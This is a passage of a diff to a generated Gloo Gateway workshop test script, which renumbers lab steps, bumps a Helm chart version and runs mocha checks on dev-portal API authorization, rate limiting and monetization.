+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-rate-limited.test.js.liquid from lab number 27"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
 helm repo add gloo-portal-idp-connect https://storage.googleapis.com/gloo-mesh-enterprise/gloo-portal-idp-connect
 
 helm upgrade -i -n gloo-system \
@@ -4042,7 +4325,7 @@ kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy gloo-portal-i
 helm upgrade -i -n gloo-system \
   gloo-gateway gloo-ee-helm/gloo-ee \
   --create-namespace \
-  --version 1.18.9 \
+  --version 1.18.11 \
   --kube-context ${CLUSTER1} \
   --reuse-values \
   -f -<<EOF
@@ -4165,8 +4448,8 @@ describe("Dev portal frontend UI oauth", function () {
   });
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/dev-portal-ui-tests-oauth.test.js.liquid from lab number 25"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/dev-portal-ui-tests-oauth.test.js.liquid from lab number 27"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
 export CLIENT_ID=$(cat oauthClient | jq -r .clientId)
 export CLIENT_SECRET=$(cat oauthClient | jq -r .clientSecret)
 export APP_TOKEN=$(curl -Ssm 10 --fail-with-body \
@@ -4184,8 +4467,8 @@ describe("Access to API unauthorized", () => {
   it('Response code is 403', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', retCode: 403 }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-unauthorized.test.js.liquid from lab number 25"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-unauthorized.test.js.liquid from lab number 27"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
 cat <<'EOF' > ./test.js
 const helpers = require('./tests/chai-http');
 
@@ -4193,8 +4476,8 @@ describe("Access to API rate limited", () => {
   it('Response code is 429', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.APP_TOKEN}], retCode: 429 }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-oauth.test.js.liquid from lab number 25"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-oauth.test.js.liquid from lab number 27"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: gateway.solo.io/v1
 kind: ListenerOption
@@ -4254,8 +4537,8 @@ describe("Monetization is working", () => {
   });
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-monetization/tests/monetization.test.js.liquid from lab number 26"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=150 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-monetization/tests/monetization.test.js.liquid from lab number 28"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=150 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 28"; exit 1; }
 kubectl --context ${CLUSTER1} apply -f data/steps/dev-portal-backstage-backend/rbac.yaml
 
 kubectl apply --context ${CLUSTER1} -f - <<EOF
@@ -4405,8 +4688,8 @@ describe("APIs displayed properly in backstage", function() {
   });
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-backstage-backend/tests/backstage-apis.test.js.liquid from lab number 27"
-timeout --signal=INT 6m mocha ./test.js --timeout 10000 --retries=250 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-backstage-backend/tests/backstage-apis.test.js.liquid from lab number 29"
+timeout --signal=INT 6m mocha ./test.js --timeout 10000 --retries=250 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 29"; exit 1; }
 helm repo add open-telemetry https://open-telemetry.github.io/opentelemetry-helm-charts
 helm repo update
 
